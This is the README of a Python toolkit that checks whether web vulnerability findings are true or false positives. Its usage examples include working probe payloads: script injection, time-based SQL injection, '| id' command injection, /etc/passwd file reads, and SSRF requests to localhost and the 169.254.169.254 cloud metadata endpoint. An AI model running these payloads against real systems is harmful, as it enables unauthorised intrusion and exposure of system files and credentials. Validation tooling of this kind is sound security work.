# Security Validator Toolkit

**Version: 1.0**
**Last Updated: September 26, 2025**

A generic and configurable Python-based toolkit designed to deterministically validate security findings. This tool helps security professionals, developers, and penetration testers quickly confirm if a potential vulnerability is a true positive or a false positive, saving time and effort in the vulnerability management lifecycle.

Unlike hardcoded scripts, this toolkit is built to work with any web application by accepting all necessary parameters—such as target URL, credentials, and headers—directly from the command line.

### Key Features

* **Completely Generic:** No hardcoded URLs, credentials, or application-specific logic.
* **Modular Design:** Each vulnerability class has its own validator, making the tool easy to maintain and extend.
* **Multiple Vulnerability Classes:** Supports validation for XSS, Open Redirect, SQL Injection, RCE/File Read, and SSRF.
* **Authentication Support:** Test endpoints protected by authentication using custom HTTP headers (e.g., Bearer tokens, cookies).
* **Flexible Output:** Choose between human-readable text or machine-readable JSON output.
* **Supports GET & POST:** Validate vulnerabilities in both URL parameters and request bodies.

---

## Installation

### 1. Prerequisites
* Python 3.7+
* `pip` and `venv`
* Google Chrome browser installed
* **ChromeDriver**: You must download the ChromeDriver that matches your installed Chrome version.
    * **Download Link:** [https://chromedriver.chromium.org/downloads](https://chromedriver.chromium.org/downloads)
    * After downloading, ensure the `chromedriver` executable is placed in a directory included in your system's `PATH`.

### 2. Setup Instructions

1.  **Clone the Repository:**
    ```bash
    git clone [https://github.com/your-username/security-validator.git](https://github.com/your-username/security-validator.git)
    cd security-validator
    ```

2.  **Create and Activate a Virtual Environment:**
    ```bash
    # Create the virtual environment
    python -m venv venv

    # Activate it (macOS/Linux)
    source venv/bin/activate

    # Activate it (Windows)
    .\venv\Scripts\activate
    ```

3.  **Install Dependencies:**
    ```bash
    pip install -r requirements.txt
    ```

---

## Usage

The toolkit is operated via the command line. All commands follow this basic structure:

```bash
python validator.py --type <type> --url <target_url> --payload "<payload>" [options]
Command-Line Arguments
Argument	Description	Required	Default
--type	The type of vulnerability to validate. Choices: xss, open_redirect, sqli, rce, ssrf.	Yes	N/A
--url	The full target URL, ending at the injection point (e.g., .../page?param=).	Yes	N/A
--payload	The vulnerability payload to test.	Yes	N/A
--method	HTTP method to use for the request. Choices: GET, POST.	No	GET
--data	Request body for POST requests. Use PAYLOAD as a placeholder for the payload (e.g., user=test&comment=PAYLOAD).	No	None
--headers	JSON-formatted string of HTTP headers for authentication or custom fields (e.g., '{"Authorization": "Bearer ...", "Cookie": "..."}').	No	None
--output	Output format. Choices: text, json.	No	text

Export to Sheets
Validator Details & Example Payloads
Below are detailed explanations and practical examples for each validator.

1. Cross-Site Scripting (XSS) 💉
How It Works: Uses a headless Chrome browser to visit the target URL with the payload. It confirms a vulnerability if a JavaScript alert() box is triggered or if the non-encoded payload is reflected in the page's HTML source.

Theoretical Justification: A headless browser can execute JavaScript, making it highly effective for detecting not just reflected XSS but also DOM-based XSS. This method confirms that a browser would actually interpret and run the malicious script.

Example Payloads:
True Positive (Reflected XSS):

Bash

python validator.py --type xss --url "[http://testphp.vulnweb.com/listproducts.php?cat=](http://testphp.vulnweb.com/listproducts.php?cat=)" --payload "<script>alert('xss')</script>"
Expected Output: Result: True Positive, Reason: Alert popup detected.

True Positive (HTML Injection):

Bash

python validator.py --type xss --url "[http://testphp.vulnweb.com/search.php?test=query](http://testphp.vulnweb.com/search.php?test=query)" --payload "<h1>Injected</h1>"
Expected Output: Result: True Positive, Reason: Payload found in page source.

False Positive (Sanitized Input):

Bash

python validator.py --type xss --url "[https://google.com/search?q=](https://google.com/search?q=)" --payload "<script>alert('xss')</script>"
Expected Output: Result: False Positive, Reason: No alert popup and payload not in source.

2. Open Redirect ↪️
How It Works: Sends a request with a payload pointing to an external domain. It inspects the Location response header to see if the server attempts to redirect the user to that external domain.

Theoretical Justification: This method directly checks the server's redirect instruction without following it, reliably confirming if the application can be abused to redirect users to malicious sites.

Example Payloads:
True Positive:

Bash

python validator.py --type open_redirect --url "[http://testphp.vulnweb.com/login.php?from=](http://testphp.vulnweb.com/login.php?from=)" --payload "[https://www.google.com](https://www.google.com)"
Expected Output: Result: True Positive, Reason: Redirected to https://www.google.com

False Positive:

Bash

python validator.py --type open_redirect --url "[https://google.com/search?q=](https://google.com/search?q=)" --payload "[https://www.evil.com](https://www.evil.com)"
Expected Output: Result: False Positive, Reason: No redirect detected.

3. SQL Injection (SQLi) 💿
How It Works: Probes for vulnerabilities using two methods:

Error-Based: Appends a single quote (') and checks the response for common database error messages.

Time-Based: Injects a command to force the database to wait (e.g., WAITFOR DELAY) and measures if the server's response is delayed.

Theoretical Justification: Analyzing differential responses is a classic method for SQLi detection. Error messages are a direct leak of backend failure, while a time delay is strong evidence of a blind SQLi where the database is executing injected commands.

Example Payloads:
True Positive (Error-Based):

Bash

python validator.py --type sqli --url "[http://testphp.vulnweb.com/listproducts.php?cat=](http://testphp.vulnweb.com/listproducts.php?cat=)" --payload "1"
Expected Output: Result: True Positive, Reason: Error-based SQLi detected.

True Positive (Time-Based Blind SQLi for SQL Server):

Bash

python validator.py --type sqli --url "[http://vulnerable-app.com/items.aspx?id=](http://vulnerable-app.com/items.aspx?id=)" --payload "1; WAITFOR DELAY '0:0:5'--"
Expected Output: Result: True Positive, Reason: Time-based SQLi detected.

False Positive:

Bash

python validator.py --type sqli --url "[https://google.com/search?q=](https://google.com/search?q=)" --payload "1'"
Expected Output: Result: False Positive, Reason: No SQLi detected.

4. Remote Code Execution (RCE) / File Read 💻
How It Works: Injects payloads designed to run system commands (like id or whoami) or read common sensitive files (like /etc/passwd). It then checks the server's response for the expected output.

Theoretical Justification: This provides direct, undeniable proof of RCE by capturing the output of a command executed on the server, or confirms a Local File Inclusion (LFI) vulnerability by retrieving a system file's content.

Example Payloads:
True Positive (Command Injection - Linux):

Bash

python validator.py --type rce --url "[http://testphp.vulnweb.com/showimage.php?file=](http://testphp.vulnweb.com/showimage.php?file=)" --payload "| id"
Expected Output: Result: True Positive, Reason: RCE/File read detected. (if uid=... is in response)

True Positive (File Read - LFI):

Bash

python validator.py --type rce --url "[http://vulnerable-app.com/view.php?page=](http://vulnerable-app.com/view.php?page=)" --payload "/etc/passwd"
Expected Output: Result: True Positive, Reason: RCE/File read detected. (if root:x:0:0 is in response)

False Positive:

Bash

python validator.py --type rce --url "[https://google.com/search?q=](https://google.com/search?q=)" --payload "| id"
Expected Output: Result: False Positive, Reason: No RCE/File read detected.

5. Server-Side Request Forgery (SSRF) 🌐
How It Works: Injects a payload containing a URL that points to a known internal or metadata service (like localhost or 169.254.169.254). It checks the response for content characteristic of that internal service.

Theoretical Justification: If the application fetches and returns content from an internal-only IP address, it confirms the server can be used as a proxy to scan and attack internal network resources.

Example Payloads:
True Positive (Accessing localhost):

Bash

python validator.py --type ssrf --url "[https://vulnerable-app.com/proxy?url=](https://vulnerable-app.com/proxy?url=)" --payload "http://localhost/server-status"
Expected Output: Result: True Positive, Reason: SSRF detected. (if response contains "Apache Server Status")

True Positive (Cloud Metadata Endpoint):

Bash

python validator.py --type ssrf --url "[https://vulnerable-app.com/proxy?url=](https://vulnerable-app.com/proxy?url=)" --payload "[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)"
Expected Output: Result: True Positive, Reason: SSRF detected. (if response lists metadata like ami-id)

False Positive:

Bash

python validator.py --type ssrf --url "[https://google.com/](https://google.com/)" --payload "http://localhost"
Expected Output: Result: False Positive, Reason: No SSRF detected.

Advanced Usage
Testing with POST Requests
To test a parameter in a POST request body, use the --method POST and --data flags. Use the string PAYLOAD in the data argument where the payload should be injected.

Bash

python validator.py \
  --type xss \
  --method POST \
  --url "[https://vulnerable-app.com/comment](https://vulnerable-app.com/comment)" \
  --data "username=guest&comment=PAYLOAD" \
  --payload "<h1>XSS-TEST</h1>"
Testing Authenticated Endpoints
Use the --headers flag to provide authentication tokens, cookies, or any other required HTTP headers as a JSON string.

Bash

python validator.py \
  --type rce \
  --url "[https://api.internal-app.com/v1/tools?cmd=](https://api.internal-app.com/v1/tools?cmd=)" \
  --payload "whoami" \
  --headers '{"Authorization": "Bearer eyJhbGciOiJI...", "X-API-Version": "2"}'
AI Assistance Section
This toolkit was developed with assistance from AI. Key prompts used during development include:

"Design a generic, modular Python toolkit for validating security vulnerabilities like XSS, SQLi, and Open Redirect."

"Create a Python class for an XSS validator using Selenium that accepts custom URLs, payloads, and headers, and handles URL encoding."

"Write a command-line interface using Python's argparse to control the security validator toolkit."

"Generate correct example payloads for true positive and false positive test cases for web application vulnerabilities."